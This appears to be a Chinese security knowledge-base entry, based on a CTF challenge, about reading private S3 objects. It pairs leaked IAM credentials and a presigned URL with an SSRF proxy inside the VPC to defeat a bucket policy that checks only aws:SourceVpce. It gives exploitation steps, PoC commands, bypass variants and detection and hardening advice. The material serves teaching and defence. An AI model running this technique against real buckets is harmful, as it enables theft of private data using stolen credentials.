---
id: cloud-s3-presigned-url-vpce-bypass
title: S3 桶策略只校验 aws:SourceVpce 时，用泄露凭证预签名并经 VPC 内 SSRF 读取私有对象
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: s3-presigned-url-source-vpce-bypass
tags:
- cloud
- aws
- s3
- iam
- bucket-policy
- vpc-endpoint
- presigned-url
- ssrf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:17:58+08:00'
  notes: 已对照原文核对：桶策略 StringNotEquals aws:SourceVpce 原文截图/命令一致；图04 证实预签名 URL 经同一 proxy 取回 flag，图01 为直连 S3 AccessDenied。proxy 出站确经白名单 VPC Endpoint 属原文推断但由成功回显佐证。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/cloud/cloud-iam/cloud-s3-presigned-url-vpce-bypass/
draft: false
kb_aliases:
- 预签名 URL 绕过 VPC Endpoint
- aws SourceVpce 策略绕过
- S3 桶策略网络条件绕过
- 预签名 SSRF 组合
- presigned URL VPC endpoint
---

## 一句话结论

当 S3 桶策略只用 `StringNotEquals { aws:SourceVpce: vpce-xxx }` 拒绝 `private/*` 的 GetObject 时，攻击者可用泄露的 IAM 临时凭证生成预签名 URL，再通过位于该 VPC Endpoint 之后的 SSRF/代理取回对象：预签名 URL 补齐“身份认证”，代理补齐“网络来源”，两个独立条件同时满足。

## 原理

- 示例桶策略：
  ```json
  {
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket/private/*",
    "Condition": {"StringNotEquals": {"aws:SourceVpce": "vpce-xxx"}}
  }
  ```
  它拒绝所有“来源不是指定 VPC Endpoint”的 GetObject，属于网络路径维度的限制，不校验请求者身份。
- 攻击者直接用泄露的临时凭证 `aws s3 cp` 访问时，请求从攻击者网络发出，`aws:SourceVpce` 不匹配，得到 403（HeadObject Forbidden）。即使用凭证能 `ls` 列出对象，也读不到 `private/*`。
- 预签名 URL 把 AccessKeyId、签名、过期时间等放进查询参数；持有该 URL 的任意 HTTP 客户端都能在有效期内访问对象，不需要再带 AWS 凭证头。签名由拥有 `s3:GetObject` 权限的凭证生成。
- SSRF/代理服务运行在该 VPC 内，其出站流量经过被策略允许的 VPC Endpoint（Gateway Endpoint 或 Interface Endpoint）。代理去请求预签名 URL 时，S3 看到的 `aws:SourceVpce` 正好是白名单值，于是放行；签名则证明请求来自有权限的凭证。
- 单独 SSRF 不行：直接让代理请求 S3 对象 URL 没有 AWS 授权信息，S3 返回 AccessDenied。单独凭证也不行：直接请求不带 `aws:SourceVpce`。两者组合才成立。
- 这暴露了策略设计缺陷：把“网络位置”当作唯一授权条件，而网络内任意能发请求的服务（包括 SSRF）都可被借用。

## 触发条件

- 已获得可用的 AWS 临时凭证，且该身份对目标对象有 `s3:GetObject`（或能生成有效预签名）；
- 桶策略对敏感前缀的 Allow/Deny 仅基于 `aws:SourceVpce`、`aws:SourceVpc`、`aws:SourceIp` 等网络条件；
- 存在位于允许网络路径内的 SSRF/代理接口，能把预签名 URL 作为参数抓取并回显；
- 预签名 URL 可被正确 URL 编码后放入 SSRF 参数。

## 利用步骤

1. 用泄露凭证 `aws s3 ls s3://bucket --recursive` 枚举对象；直接 `aws s3 cp` 私有对象，确认 403 与策略中的 `aws:SourceVpce` 条件。
2. 用同一凭证为私有对象生成预签名 URL。
3. 对预签名 URL 做 URL 编码（其中 `&`、`=`、`%` 等必须编码，否则会截断 `?url=` 参数）。
4. 把编码后的 URL 传给 VPC 内 SSRF/代理接口，由它发起请求。
5. 从代理响应中读取对象内容（如 flag）。

## PoC

```bash
# 1) 生成预签名并整体 URL 编码
aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -sRr @uri

# 2) 通过 SSRF/代理请求（代理位于被允许的 VPC Endpoint 之后）
curl "https://target/proxy?url=https%3A%2F%2Fchallenge01-470f711.s3.us-east-1.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Credential%3D...%26X-Amz-Signature%3D..."
```

响应：

```text
The flag is: WIZ_CTF{...}
```

对比：直接 `aws s3 cp s3://bucket/private/flag.txt ./` 返回：

```text
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

## 变体与关联

- 变体：条件键换成 `aws:SourceVpc`、`aws:SourceVpceArn`、`aws:SourceIp` 时，同样通过“从允许网络内的 SSRF 发起请求”满足。
- 变体：若代理不允许任意 URL，可用允许域名重定向、DNS rebinding 或路径混淆绕过，再把请求落到 S3。
- 变体：预签名也可用于写对象（PutObject），若策略只限制网络来源，可能进一步覆盖/投放内容。
- 关联：[[cloud-metadata-ssrf-imdsv2-token-credential]]（获取临时凭证的前一步）；[[web-generic-ssrf-cloud-metadata]]（SSRF 基础）。
- 边界：桶策略同时校验身份（Principal/角色）与网络条件、或禁止预签名、或 SSRF 出口不经过允许的 VPC Endpoint 时，本手法不成立。

## 检测与防御

- 检测：桶策略中出现仅以 `aws:SourceVpce`/`aws:SourceVpc`/`aws:SourceIp` 为条件的 Deny/Allow；CloudTrail 中出现来自预期外 IP/实例的预签名 URL 访问。
- 检测：应用代理接口收到指向 S3 预签名 URL 的请求；同一凭证短时间内大量生成预签名。
- 防御：敏感对象授权应同时校验身份（IAM Principal/角色）与网络条件，不能只依赖 VPC Endpoint；使用桶策略 + VPC Endpoint Policy 双层限制。
- 加固：限制 `s3:GetObject` 与预签名权限；凭证最小权限并短期轮换；阻断不必要的出站代理；监控异常预签名访问。
